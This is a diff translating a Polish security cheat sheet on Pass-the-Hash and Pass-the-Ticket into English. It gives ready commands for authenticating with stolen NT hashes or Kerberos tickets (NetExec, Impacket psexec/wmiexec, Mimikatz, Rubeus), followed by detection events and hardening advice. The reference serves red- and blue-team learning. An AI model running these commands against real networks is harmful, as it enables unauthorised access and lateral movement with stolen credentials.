@@ -12,41 +12,41 @@ author: "core"
 # Pass-the-Hash / Pass-the-Ticket
 
 ## TL;DR
-Nie musisz znać hasła — wystarczy hash NT (PtH, NTLM) lub bilet Kerberos (PtT). Uwierzytelniasz się jako ofiara bez łamania hasła.
+You don't need the password — just the NT hash (PtH, NTLM) or a Kerberos ticket (PtT). You authenticate as the victim without cracking the password.
 
 ## Pass-the-Hash (NTLM)
 ```bash
-# NetExec / CrackMapExec – wykonaj polecenie zdalnie
+# NetExec / CrackMapExec – run a command remotely
 nxc smb 10.10.10.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:<NThash> -x whoami
-# Impacket – interaktywny shell
+# Impacket – interactive shell
 impacket-psexec -hashes :<NThash> administrator@10.10.10.20
-impacket-wmiexec -hashes :<NThash> administrator@10.10.10.20   # ciszej niż psexec
+impacket-wmiexec -hashes :<NThash> administrator@10.10.10.20   # quieter than psexec
 ```
 ```powershell
-# Mimikatz – sekurlsa PtH (uruchamia proces z hashem)
+# Mimikatz – sekurlsa PtH (starts a process with the hash)
 sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NThash> /run:cmd.exe
 ```
 
 ## Pass-the-Ticket (Kerberos)
 ```powershell
-# Zaimportuj bilet .kirbi do bieżącej sesji
+# Import a .kirbi ticket into the current session
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 ```bash
-# Linux – użyj ccache
+# Linux – use a ccache
 export KRB5CCNAME=ticket.ccache
 impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
 ```
 
-## Wykrywanie (Blue Team)
-- Logon type 3 (network) NTLM z hosta użytkownika do wielu maszyn (Event 4624/4776).
-- Bilety Kerberos używane z innego hosta niż wystawiony; nietypowe logon anomalie.
-- EDR: `lsass` dostęp (kradzież hasha), zdalne wykonanie psexec/wmiexec (7045, 4688).
+## Detection (Blue Team)
+- Logon type 3 (network) NTLM from a user's host to many machines (Event 4624/4776).
+- Kerberos tickets used from a host other than where issued; logon anomalies.
+- EDR: `lsass` access (hash theft), remote exec via psexec/wmiexec (7045, 4688).
 
-## Mitygacja / Hardening
-- Credential Guard, LSASS PPL, ograniczenie logowań lokalnych adminów (LAPS).
-- Windows Defender / tiering: konta Tier 0 tylko na hostach Tier 0.
-- Wymuś Kerberos AES, monitoruj `psexec`/`wmiexec` sygnatury.
+## Mitigation / Hardening
+- Credential Guard, LSASS PPL, restrict local admin logons (LAPS).
+- Windows Defender / tiering: Tier 0 accounts only on Tier 0 hosts.
+- Enforce Kerberos AES, monitor `psexec`/`wmiexec` signatures.
 
-## Źródła
+## Sources
 - [MITRE T1550](https://attack.mitre.org/techniques/T1550/)
